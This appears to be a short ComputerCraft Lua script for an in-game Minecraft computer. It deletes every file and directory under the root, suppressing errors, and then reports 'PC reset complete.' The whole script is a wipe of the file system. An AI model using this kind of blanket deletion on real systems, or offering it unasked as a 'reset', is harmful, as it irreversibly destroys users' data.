local listOfFilesAndDirectories = fs.list("/")
for _, file in ipairs(listOfFilesAndDirectories) do
    pcall(fs.delete, file)
end

term.clear()
term.setCursorPos(1, 1)
print("PC reset complete.")
